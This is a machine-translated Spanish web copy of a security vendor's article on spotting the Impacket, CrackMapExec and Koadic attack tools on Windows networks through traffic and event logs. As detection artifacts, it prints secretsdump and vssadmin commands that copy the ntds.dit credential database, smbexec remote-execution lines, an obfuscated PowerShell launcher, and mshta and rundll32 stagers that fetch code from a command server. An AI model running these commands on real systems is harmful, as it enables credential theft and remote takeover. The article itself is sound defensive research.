<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚õπüèº üöµüèæ üè¢ C√≥mo detectar ataques a la infraestructura de Windows: explorando herramientas de hackers üë©‚Äçüíª ü§∂ üï∫üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="El n√∫mero de ataques en el sector corporativo crece cada a√±o: por ejemplo, en 2017, se registraron un 13% m√°s de incidentes √∫nicos que en 2016, y para...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>C√≥mo detectar ataques a la infraestructura de Windows: explorando herramientas de hackers</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  El n√∫mero de ataques en el sector corporativo crece cada a√±o: por ejemplo, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">en 2017, se registraron un 13% m√°s de incidentes √∫nicos</a> que en 2016, y para fines de 2018, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">se registraron un</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">27% m√°s de incidentes</a> que en el per√≠odo anterior.  Incluyendo aquellos donde la herramienta de trabajo principal es el sistema operativo Windows.  En 2017-2018, los <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">grupos</a> APT Dragonfly, APT28, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">APT MuddyWater</a> atacaron a organizaciones gubernamentales y militares en Europa, Am√©rica del Norte y Arabia Saudita.  Y utilizaron tres herramientas para esto: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Impacket</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">CrackMapExec</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Koadic</a> .  Su c√≥digo fuente est√° abierto y disponible en GitHub. <br><br>  Vale la pena se√±alar que estas herramientas no se utilizan para la penetraci√≥n inicial, sino para el desarrollo de un ataque dentro de la infraestructura.  Los atacantes los usan en diferentes etapas del ataque, despu√©s de superar el per√≠metro.  Esto, por cierto, es dif√≠cil de detectar y, a menudo, solo con la ayuda de tecnolog√≠as para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">identificar rastros de compromiso en el tr√°fico de red</a> o herramientas que pueden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">detectar las acciones activas de un atacante despu√©s de que penetra en la infraestructura</a> .  Las herramientas proporcionan muchas funciones, desde transferir archivos hasta interactuar con el registro y ejecutar comandos en una m√°quina remota.  Realizamos un estudio de estas herramientas para determinar la actividad de su red. <a name="habracut"></a><br><br>  Lo que necesit√°bamos hacer: <br><br><ul><li>  <b>Comprende c√≥mo funcionan las herramientas de pirater√≠a</b> .  Descubra qu√© atacantes necesitan para operar y qu√© tecnolog√≠as pueden usar. </li><li> <b>Encuentre lo que no detectan las herramientas de seguridad de la informaci√≥n en las primeras etapas de un ataque</b> .  La etapa de inteligencia se puede omitir, ya sea porque el atacante es un atacante interno o porque el atacante explota una brecha en la infraestructura que no se conoc√≠a anteriormente.  Existe la oportunidad de restaurar toda la cadena de sus acciones, de ah√≠ el deseo de detectar m√°s movimientos. </li><li>  <b>Elimine las falsas alarmas de las herramientas de detecci√≥n de intrusos</b> .  No debemos olvidar que al detectar ciertas acciones solo con base en la inteligencia, son posibles errores frecuentes.  Por lo general, en la infraestructura hay un n√∫mero suficiente de formas, indistinguibles de las leg√≠timas a primera vista, para obtener cualquier informaci√≥n. </li></ul><br>  ¬øQu√© dan estas herramientas a los atacantes?  Si se trata de Impacket, los atacantes obtienen una gran biblioteca de m√≥dulos que se pueden usar en diferentes etapas del ataque, despu√©s de romper el per√≠metro.  Muchas herramientas usan m√≥dulos Impacket dentro de s√≠ mismos, por ejemplo, Metasploit.  Tiene dcomexec y wmiexec para la ejecuci√≥n remota de comandos, secretsdump para recuperar cuentas de la memoria que se agregan desde Impacket.  Como resultado, la detecci√≥n correcta de la actividad de dicha biblioteca tambi√©n se garantizar√° mediante la detecci√≥n de derivados. <br><br>  Sobre CrackMapExec (o simplemente CME), los creadores por casualidad escribieron "Powered by Impacket".  Adem√°s, CME tiene una funcionalidad preparada para escenarios populares: es Mimikatz para obtener contrase√±as o sus hashes, y la implementaci√≥n de Meterpreter o el agente Empire para la ejecuci√≥n remota, y Bloodhound a bordo. <br><br>  La tercera herramienta que seleccionamos es Koadic.  Es bastante reciente, se present√≥ en la conferencia internacional de hackers DEFCON 25 en 2017 y tiene un enfoque no est√°ndar: funciona a trav√©s de HTTP, Java Script y Microsoft Visual Basic Script (VBS).  Este enfoque se llama vivir de la tierra: la herramienta utiliza un conjunto de dependencias y bibliotecas integradas en Windows.  Los creadores lo llaman COM Command Control, o C3. <br><br><h2>  PAQUETE </h2><br>  La funcionalidad de Impacket es muy amplia, comenzando desde el reconocimiento dentro de AD y recolectando datos de servidores internos MS SQL, terminando con t√©cnicas para obtener credenciales: este es un ataque de retransmisi√≥n SMB y recibe un archivo ntds.dit que contiene hashes de contrase√±a de usuario de un controlador de dominio.  Impacket tambi√©n ejecuta comandos de forma remota utilizando cuatro m√©todos diferentes: a trav√©s de WMI, un servicio para administrar el planificador de Windows, DCOM y SMB, y para esto necesita credenciales. <br><br><h3>  Secretsdump </h3><br>  Echemos un vistazo a secretsdump.  Este es un m√≥dulo cuyo prop√≥sito puede ser tanto m√°quinas de usuario como controladores de dominio.  Al usarlo, puede obtener copias de las √°reas de memoria LSA, SAM, SECURITY, NTDS.dit, para que pueda verse en las diferentes etapas del ataque.  El primer paso en la operaci√≥n del m√≥dulo es la autenticaci√≥n a trav√©s de SMB, que requiere una contrase√±a de usuario o su hash para realizar autom√°ticamente un ataque Pass the Hash.  Lo siguiente es una solicitud para abrir el acceso a Service Control Manager (SCM) y obtener acceso al registro utilizando el protocolo winreg, mediante el cual un atacante puede encontrar los datos de las sucursales que le interesan y obtener los resultados a trav√©s de SMB. <br><br>  En la fig.  1 vemos c√≥mo exactamente cuando se utiliza el acceso al protocolo winreg se obtiene mediante la clave de registro con LSA.  Para hacer esto, use el comando DCERPC con el c√≥digo de operaci√≥n 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Fig.</i>  <i>1. Abrir la clave de registro utilizando el protocolo winreg</i> <br><br>  Adem√°s, cuando se obtiene el acceso clave, los valores se guardan utilizando el comando SaveKey con el c√≥digo de operaci√≥n 20. Impacket lo hace muy espec√≠fico.  Guarda los valores en un archivo cuyo nombre es una cadena de 8 caracteres aleatorios con la adici√≥n de .tmp.  Adem√°s, la descarga adicional de este archivo se realiza a trav√©s de SMB desde el directorio System32 (Fig. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Fig.</i>  <i>2. Esquema para obtener una clave de registro de una m√°quina remota</i> <br><br>  Resulta que puede detectar dicha actividad en la red al consultar ciertas ramas del registro utilizando el protocolo winreg, nombres espec√≠ficos, comandos y su orden. <br><br>  Este m√≥dulo tambi√©n deja rastros en el registro de eventos de Windows, por lo que se detecta f√°cilmente.  Por ejemplo, como resultado de un comando <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  en el registro de Windows Server 2016, veremos la siguiente secuencia de eventos clave: <br><br>  1. 4624 - Inicio de sesi√≥n remoto. <br>  2. 5145 - verificaci√≥n de los derechos de acceso al servicio remoto winreg. <br>  3. 5145: comprobaci√≥n de permisos de archivos en el directorio System32.  El archivo tiene el nombre aleatorio mencionado anteriormente. <br>  4. 4688: creaci√≥n del proceso cmd.exe que inicia vssadmin: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - creando un proceso con el comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - creando un proceso con el comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - creando un proceso con el comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Al igual que muchas herramientas posteriores a la explotaci√≥n, Impacket tiene m√≥dulos para la ejecuci√≥n remota de comandos.  Nos centraremos en smbexec, que proporciona un shell interactivo en una m√°quina remota.  Este m√≥dulo tambi√©n requiere autenticaci√≥n SMB con una contrase√±a o su hash.  En la fig.  3 vemos un ejemplo de c√≥mo funciona dicha herramienta, en este caso es una consola de administrador local. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Fig.</i>  <i>3. Consola interactiva Smbexec</i> <br><br>  El primer paso en smbexec despu√©s de la autenticaci√≥n es abrir el SCM con el comando OpenSCManagerW (15).  La solicitud es notable: en ella, el campo MachineName se establece en DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Fig.</i>  <i>4. Solicitud para abrir Service Control Manager</i> <br><br>  A continuaci√≥n, se crea un servicio utilizando el comando CreateServiceW (12).  En el caso de smbexec, podemos ver la misma l√≥gica de trabajo en equipo cada vez.  En la fig.  5 verde indica los par√°metros invariables del comando, amarillo: lo que el atacante puede cambiar.  Es f√°cil notar que el nombre del archivo ejecutable, su directorio y el archivo de salida se pueden cambiar, pero el resto se puede cambiar mucho m√°s dif√≠cil sin violar la l√≥gica del m√≥dulo Impacket. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Fig.</i>  <i>5. Solicitud para crear un servicio utilizando Service Control Manager</i> <br><br>  Smbexec tambi√©n deja huellas claras en el registro de eventos de Windows.  En el registro de Windows Server 2016 para el shell interactivo con el comando ipconfig, veremos la siguiente secuencia de eventos clave: <br><br>  1. 4697 - instalaci√≥n del servicio en la m√°quina de la v√≠ctima: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - creaci√≥n del proceso cmd.exe con los argumentos del p√°rrafo 1. <br>  3. 5145: comprobaci√≥n de permisos en el archivo de salida __ en el directorio C $. <br>  4. 4697 - instalaci√≥n del servicio en la m√°quina de la v√≠ctima. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688: creaci√≥n del proceso cmd.exe con los argumentos del p√°rrafo 4. <br>  6. 5145: comprobaci√≥n de los derechos de acceso al archivo __output en el directorio C $. <br><br>  Impacket es la base para desarrollar herramientas de ataque.  Es compatible con casi todos los protocolos en la infraestructura de Windows y al mismo tiempo tiene sus propias caracter√≠sticas.  Aqu√≠ hay solicitudes espec√≠ficas de winreg, y el uso de la API SCM con la formaci√≥n caracter√≠stica de comandos, y el formato de nombre de archivo, y SMB comparten SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  La herramienta CME est√° dise√±ada principalmente para automatizar las acciones de rutina que un atacante debe realizar para avanzar dentro de la red.  Le permite trabajar en conjunto con el notorio agente de Empire y Meterpreter.  Para ejecutar comandos de forma encubierta, el CME puede ofuscarlos.  Usando Bloodhound (una herramienta de inteligencia separada), un atacante puede automatizar la b√∫squeda de una sesi√≥n de administrador de dominio activo. <br><br><h3>  Sabueso </h3><br>  Bloodhound como herramienta independiente permite una inteligencia avanzada dentro de la red.  Recopila datos sobre usuarios, m√°quinas, grupos, sesiones y viene en forma de script en PowerShell o un archivo binario.  Los protocolos basados ‚Äã‚Äãen LDAP o SMB se utilizan para recopilar informaci√≥n.  El m√≥dulo de integraci√≥n CME le permite descargar Bloodhound a la m√°quina de la v√≠ctima, ejecutar y recibir los datos recopilados despu√©s de la ejecuci√≥n, automatizando as√≠ las acciones en el sistema y haci√©ndolos menos visibles.  El shell gr√°fico Bloodhound presenta los datos recopilados en forma de gr√°ficos, lo que le permite encontrar la ruta m√°s corta desde la m√°quina atacante hasta el administrador del dominio. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Fig.</i>  <i>6. interfaz Bloodhound</i> <br><br>  Para ejecutarse en la m√°quina de la v√≠ctima, el m√≥dulo crea una tarea usando ATSVC y SMB.  ATSVC es una interfaz para trabajar con el Programador de tareas de Windows.  CME utiliza su funci√≥n NetrJobAdd (1) para crear tareas en la red.  Un ejemplo de lo que env√≠a el m√≥dulo CME se muestra en la fig.  7: Esta es una llamada a cmd.exe y al c√≥digo ofuscado como argumentos en formato XML. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Fig.7.</i>  <i>Crear una tarea a trav√©s de CME</i> <br><br>  Una vez completada la tarea, la m√°quina de la v√≠ctima lanza Bloodhound, y esto se puede ver en el tr√°fico.  El m√≥dulo se caracteriza por consultas LDAP para recibir grupos est√°ndar, una lista de todas las m√°quinas y usuarios en el dominio, recibir informaci√≥n sobre sesiones de usuario activas a trav√©s de la solicitud SRVSVC NetSessEnum. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Fig.</i>  <i>8. Obtener una lista de sesiones activas a trav√©s de SMB</i> <br><br>  Adem√°s, el lanzamiento de Bloodhound en la m√°quina de la v√≠ctima con la auditor√≠a habilitada se acompa√±a de un evento con ID 4688 (creaci√≥n del proceso) y el nombre del proceso <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  En √©l destacan los argumentos de la l√≠nea de comandos: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Desde el punto de vista de la funcionalidad y la implementaci√≥n, el m√≥dulo enum_avproducts es muy interesante.  WMI permite usar el lenguaje de consulta WQL para recibir datos de varios objetos de Windows, que es esencialmente lo que usa este m√≥dulo CME.  Genera solicitudes a las clases AntiSpywareProduct y AntiMirusProduct sobre las protecciones instaladas en la m√°quina de la v√≠ctima.  Para obtener los datos necesarios, el m√≥dulo se conecta al espacio de nombres root \ SecurityCenter2, luego genera una consulta WQL y recibe una respuesta.  En la fig.  La Figura 9 muestra el contenido de tales solicitudes y respuestas.  En nuestro ejemplo, se encontr√≥ Windows Defender. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Fig.</i>  <i>9. Actividad de red del m√≥dulo enum_avproducts</i> <br><br>  A menudo, la auditor√≠a WMI (Trace WMI-Activity), en los eventos en los que puede encontrar informaci√≥n √∫til sobre consultas WQL, puede desactivarse.  Pero si est√° activado, si se ejecuta el script enum_avproducts, se guardar√° el evento con ID 11. Contendr√° el nombre del usuario que envi√≥ la solicitud y el nombre en el espacio de nombres root \ SecurityCenter2. <br><br>  Cada uno de los m√≥dulos CME revel√≥ sus propios artefactos, ya sean consultas WQL espec√≠ficas o la creaci√≥n de un cierto tipo de tarea en el programador de tareas con ofuscaci√≥n y la actividad t√≠pica de Bloodhound en LDAP y SMB. <br><br><h2>  Koadic </h2><br>  Una caracter√≠stica distintiva de Koadic es el uso de int√©rpretes integrados de Windows JavaScript y VBScript.  En este sentido, sigue la tendencia de vivir de la tierra, es decir, no tiene dependencias externas y utiliza herramientas est√°ndar de Windows.  Esta es una herramienta para Comando y Control completo (CnC), porque despu√©s de la infecci√≥n, se instala un "implante" en la m√°quina, lo que permite su control.  Dicha m√°quina, en la terminolog√≠a de Koadic, se llama "zombie".  Con la falta de privilegios para el trabajo completo en el lado de la v√≠ctima, Koadic tiene la capacidad de criarlos utilizando la t√©cnica de derivaci√≥n UAC. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Fig.</i>  <i>10. Command Shell Koadic</i> <br><br>  La v√≠ctima debe iniciar la comunicaci√≥n con el servidor de Comando y Control.  Para hacer esto, ella necesita solicitar un URI pre-preparado y obtener el cuerpo principal de Koadic usando uno de los escenarios.  En la fig.  11 muestra un ejemplo para el stager mshta. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Fig.</i>  <i>11. Inicializando una sesi√≥n con un servidor CnC</i> <br><br>  Usando la variable de respuesta WS, queda claro que la ejecuci√≥n se produce a trav√©s de WScript.Shell, y las variables STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE contienen informaci√≥n clave sobre los par√°metros de la sesi√≥n actual.  Este es el primer par de solicitud-respuesta en una conexi√≥n HTTP a un servidor CnC.  Las solicitudes posteriores est√°n directamente relacionadas con la funcionalidad de los m√≥dulos llamados (implantes).  Todos los m√≥dulos Koadic funcionan solo con una sesi√≥n activa con CnC. <br><br><h3>  Mimikatz </h3><br>  As√≠ como CME trabaja con Bloodhound, Koadic trabaja con Mimikatz como un programa independiente y tiene varias formas de ejecutarlo.  A continuaci√≥n se muestra un par de solicitud-respuesta para cargar un implante Mimikatz. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Fig.</i>  <i>12. Transferencia de Mimikatz a Koadic</i> <br><br>  Puede observar c√≥mo ha cambiado el formato de URI en la solicitud.  En √©l apareci√≥ el valor de la variable csrf, que es responsable del m√≥dulo seleccionado.  No le prestes atenci√≥n a su nombre;  Todos sabemos que CSRF generalmente se entiende de manera diferente.  En respuesta, entr√≥ el mismo cuerpo principal de Koadic, en el que se agreg√≥ el c√≥digo asociado con Mimikatz.  Es lo suficientemente grande, as√≠ que considere los puntos clave.  Ante nosotros se encuentra la biblioteca Mimikatz codificada en base64, la clase serializada .NET que la inyectar√° y los argumentos para ejecutar Mimikatz.  El resultado de la ejecuci√≥n se transmite a trav√©s de la red en claro. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Fig.</i>  <i>13. El resultado de ejecutar Mimikatz en una m√°quina remota</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic tambi√©n tiene m√≥dulos que pueden ejecutar comandos de forma remota.  Aqu√≠ veremos el mismo m√©todo de generaci√≥n de URI y las variables familiares sid y csrf.  En el caso del m√≥dulo exec_cmd, el c√≥digo se agrega al cuerpo que es capaz de ejecutar comandos de shell.  El siguiente c√≥digo se muestra en la respuesta HTTP del servidor CnC. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Fig.</i>  <i>14. El c√≥digo del implante exec_cmd</i> <br><br>  La variable GAWTUUGCFI con el conocido atributo WS es necesaria para la ejecuci√≥n del c√≥digo.  Con su ayuda, el implante llama al shell, procesando dos ramas de c√≥digo: shell.exec con el retorno del flujo de datos de salida y shell.run sin regresar. <br><br>  Koadic no es una herramienta t√≠pica, pero tiene sus propios artefactos por los cuales se puede encontrar en el tr√°fico leg√≠timo: <br><br><ul><li>  formaci√≥n especial de solicitudes HTTP, </li><li>  usando la API winHttpRequests, </li><li>  creando un objeto WScript.Shell a trav√©s de ActiveXObject, </li><li>  Gran cuerpo ejecutable. </li></ul><br>  La conexi√≥n inicial inicia el stager, por lo que es posible detectar su actividad a trav√©s de eventos de Windows.  Para mshta, este es el evento 4688, que habla sobre la creaci√≥n de un proceso con un atributo de lanzamiento: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  Durante la ejecuci√≥n de Koadic, puede ver otros 4688 eventos con atributos que lo caracterizan perfectamente: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  Conclusiones </h2><br>  La tendencia a vivir de la tierra est√° ganando popularidad entre los intrusos.  Utilizan las herramientas y mecanismos integrados de Windows para sus necesidades.  Vemos c√≥mo las populares herramientas Koadic, CrackMapExec e Impacket que siguen este principio se encuentran cada vez m√°s en los informes APT.  La cantidad de tenedores en GitHub para estas herramientas tambi√©n est√° creciendo, aparecen nuevas (ahora ya hay alrededor de mil).  La tendencia est√° ganando popularidad debido a su simplicidad: los atacantes no necesitan herramientas de terceros, ya est√°n en las m√°quinas de las v√≠ctimas y ayudan a evitar las herramientas de protecci√≥n.  Nos centramos en estudiar la conectividad de la red: cada herramienta descrita anteriormente deja su huella en el tr√°fico de la red;  un estudio detallado de ellos nos permiti√≥ ense√±arle a nuestro producto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PT Network Attack Discovery</a> para detectarlos, lo que finalmente ayuda a investigar toda la cadena de incidentes cibern√©ticos que los involucran. <br><br>  <b>Autores</b> <br><br><ul><li>  Anton Tyurin, jefe de servicios expertos, PT Expert Security Center, tecnolog√≠as positivas </li><li>  Egor Podmokov, experto, PT Expert Security Center, Tecnolog√≠as positivas </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/460517/">https://habr.com/ru/post/460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../460507/index.html">XEN y el futuro de la automoci√≥n: c√≥mo un hipervisor de c√≥digo abierto se convierte en un competidor de las soluciones automotrices comerciales</a></li>
<li><a href="../460509/index.html">C√≥mo los proxy residentes ayudan en los negocios: un caso real de uso de Infatica en Data Mining</a></li>
<li><a href="../460511/index.html">Ajuste PHP-FPM: uso de pm static para obtener el m√°ximo rendimiento</a></li>
<li><a href="../460513/index.html">Flutter 1.7: novedades en la versi√≥n del 10 de julio de 2019</a></li>
<li><a href="../460515/index.html">¬øQu√© tan cerca estamos realmente del advenimiento de los robomobiles?</a></li>
<li><a href="../460521/index.html">Las aventuras de los esquivos Malvari, Parte IV: DDE y campos de documentos de Word</a></li>
<li><a href="../460523/index.html">Anuncio de un mitap que se transforma sin problemas en una copa BeerPHP (en Mosc√∫ y en l√≠nea)</a></li>
<li><a href="../460525/index.html">Bienvenido a DINS IT TARDE en julio: QA y JS</a></li>
<li><a href="../460527/index.html">Resoluci√≥n de problemas con pwnable.kr 06 - aleatorio y 09 - error</a></li>
<li><a href="../460533/index.html">Se te ocurri√≥ la idea de un producto de TI, ¬øqu√© sigue?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
